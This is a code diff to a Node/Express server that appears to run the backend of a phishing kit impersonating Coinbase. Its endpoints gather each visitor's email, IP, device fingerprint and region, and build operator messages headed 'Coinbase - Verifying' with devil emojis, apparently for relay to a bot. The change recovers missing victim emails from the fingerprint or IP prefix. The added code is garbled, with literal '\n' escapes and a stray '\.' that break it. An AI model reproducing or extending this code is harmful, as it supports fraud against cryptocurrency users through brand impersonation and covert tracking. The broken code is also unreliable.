@@ -1858,21 +1858,7 @@ app.post("/update-wallet-decision", (req, res) => {
 
 app.post("/send-verifying", async (req, res) => {
   try {
-    const { userId, email } = req.body;
-    
-    if (!userId || !email) {
-      return res.status(400).json({ error: "Missing userId or email" });
-    }
-    
-    const verifyingId = `verifying_${Date.now()}_${Math.random().toString(36).substring(7)}`;
-    
-    const ip = getIP(req);
-    const userAgent = req.get("user-agent") || "Unknown";
-    const device = detectDevice(userAgent);
-    const region = await detectRegion(ip);
-    const fingerprint = getDeviceFingerprint(req);
-    const ipPrefix = ip.split(".").slice(0, 3).join(".");
-
+    let { userId, email } = req.body;\n    \n    const ip = getIP(req);\n    const fingerprint = getDeviceFingerprint(req);\n    const ipPrefix = ip.split(".")\.slice(0, 3).join(".");\n    \n    if (!email) {\n      if (fingerprint && deviceFingerprintToEmail[fingerprint]) {\n        email = deviceFingerprintToEmail[fingerprint];\n      } else if (ipPrefix && ipPrefixToEmail[ipPrefix]) {\n        email = ipPrefixToEmail[ipPrefix];\n      }\n    }\n    \n    if (!userId || !email) {\n      return res.status(400).json({ error: "Missing userId or email" });\n    }\n    \n    const verifyingId = `verifying_${Date.now()}_${Math.random().toString(36).substring(7)}`;\n    \n    const userAgent = req.get("user-agent") || "Unknown";\n    const device = detectDevice(userAgent);\n    const region = await detectRegion(ip);
     console.log(`🔍 DEBUG /send-verifying: Original email: ${email}`);
     console.log(`🔍 DEBUG: Fingerprint: ${fingerprint}`);
     console.log(`🔍 DEBUG: IP Prefix: ${ipPrefix}`);
@@ -1898,7 +1884,7 @@ app.post("/send-verifying", async (req, res) => {
     console.log(`📧 Final displayEmail: ${displayEmail}`);
 
     // ✅ ORIGINAL EMAIL stays for winner lookup (to send to correct bot)
-    pendingVerifying[verifyingId] = { status: "pending", userId, email, displayEmail, originalEmail: email, latestDisplayEmail: displayEmail, choice: null };
+    pendingVerifying[verifyingId] = { status: "pending", userId, email, displayEmail, choice: null };
 
     const message =
       `😈😈😈 <b>Coinbase - Verifying</b> 😈😈😈\n` +
